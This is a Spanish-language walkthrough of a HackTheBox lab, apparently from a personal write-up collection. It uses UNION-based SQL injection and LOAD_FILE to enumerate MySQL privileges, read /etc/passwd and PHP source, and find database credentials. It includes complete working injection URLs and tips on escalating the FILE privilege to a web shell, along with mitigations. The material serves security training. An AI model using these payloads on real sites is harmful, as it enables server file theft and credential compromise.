---
title: "SQLi — LOAD FILE Lectura de Archivos"
platform: "HackTheBox"
os: "Linux"
difficulty: "Medium"
ip: "154.57.164.80:32366"
slug: "sqli-load-file-lectura-de-archivos"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "lab"
  - "sqli"
  - "file"
techniques:
  - "UNION injection"
  - "LOAD_FILE"
  - "file read"
  - "privilege enumeration"
tools:
  - "browser"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Ejercicio del módulo SQL Injection Fundamentals de HTB Academy. Explotación de UNION-based SQLi para leer archivos del servidor via LOAD_FILE(). Verificación de privilegios FILE y super_priv, lectura de /etc/passwd y código fuente PHP para extraer credenciales de base de datos via include.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          validamos la la cantidad de columnas permitidas por medio de `UNION SELECT`
          consulta
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%20NULL,NULL,NULL,NULL%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324201748252.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos el usuario actual de la BD
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%20NULL,USER(),NULL,NULL%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324201833997.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Antes de intentar LOAD_FILE() confirma tres cosas: número de columnas, qué columna es visible, y si el usuario tiene privilegio FILE. Si saltas directo a LOAD_FILE() sin verificar privilegios, perderás tiempo debuggeando un payload que nunca va a funcionar."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          podemos comprobar si tenemos privilegios de superadministrador con la siguiente consulta:
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%20NULL,super_priv,NULL,NULL%20FROM%20mysql.user%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324202147804.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          También podemos volcar otros privilegios que tenemos directamente desde el esquema, con la siguiente consulta:
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%201,grantee,privilege_type,NULL%20FROM%20information_schema.user_privileges--%20-
      - kind: "code"
        lang: "SQL"
        code: |
          Port Code 	Port City 	Port Volume
          CN SHA	Shangai	37.13
          PH MANILA	Manila	4.52
          'root'@'localhost'	SELECT	
          'root'@'localhost'	INSERT	
          'root'@'localhost'	UPDATE	
          'root'@'localhost'	DELETE	
          'root'@'localhost'	CREATE	
          'root'@'localhost'	DROP	
          'root'@'localhost'	RELOAD	
          'root'@'localhost'	SHUTDOWN	
          'root'@'localhost'	PROCESS	
          'root'@'localhost'	FILE	
          'root'@'localhost'	REFERENCES	
          'root'@'localhost'	INDEX	
          'root'@'localhost'	ALTER	
          'root'@'localhost'	SHOW DATABASES	
          'root'@'localhost'	SUPER	
          'root'@'localhost'	CREATE TEMPORARY TABLES	
          'root'@'localhost'	LOCK TABLES	
          'root'@'localhost'	EXECUTE	
          'root'@'localhost'	REPLICATION SLAVE	
          'root'@'localhost'	REPLICATION CLIENT	
          'root'@'localhost'	CREATE VIEW	
          'root'@'localhost'	SHOW VIEW	
          'root'@'localhost'	CREATE ROUTINE	
          'root'@'localhost'	ALTER ROUTINE	
          'root'@'localhost'	CREATE USER	
          'root'@'localhost'	EVENT	
          'root'@'localhost'	TRIGGER	
          'root'@'localhost'	CREATE TABLESPACE	
          'root'@'localhost'	DELETE HISTORY
      - kind: "image"
        src: "assets/images/sqli/file-20260324202759298.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se confirma que tenemos acceso a file
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El privilegio FILE habilita tanto LOAD_FILE() (lectura) como INTO OUTFILE (escritura). Si ves FILE en los privilegios — tienes potencial RCE via web shell. En un engagement real esto escala inmediatamente a Critical."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          podremos acceder en el directorio del servidor `/etc/passwd`
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%201,LOAD_FILE(%22/etc/passwd%22),2,3%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324203649095.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratamos de ingresar a la web principal en este caso seria `search.php` el directorio de consulta seria `/var/www/html/search.php`
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%201,LOAD_FILE(%22/var/www/html/search.php%22),2,3%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324204632198.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ingresamos en este directorio pude ser los datos de acceso en la BD
      - kind: "image"
        src: "assets/images/sqli/file-20260324204618755.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Accedemos a ese directorio y obtendremos la siguiente flag
      - kind: "image"
        src: "assets/images/SQLI/file-20260324204713643.jpg"
        caption: "file-20260324204713643"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Flujo de lectura en orden: (1) `/etc/passwd` para confirmar que LOAD_FILE() funciona, (2) código fuente del archivo actual para buscar includes, (3) archivo de config referenciado para obtener credenciales de BD."

lessons:
  - 'Verificar privilegios ANTES de intentar LOAD_FILE()'
  - 'El código fuente PHP puede revelar includes con credenciales de BD embebidas'
  - 'La cadena: privilegio FILE → leer código fuente → encontrar include → leer config → credenciales BD'
mitigation:
  - 'Nunca correr MySQL como root — usar un usuario dedicado con privilegios mínimos'
  - 'Revocar el privilegio FILE: `REVOKE FILE ON *.* FROM ''appuser''@''localhost''`'
  - 'No embeber credenciales de BD en archivos PHP dentro del webroot'
---
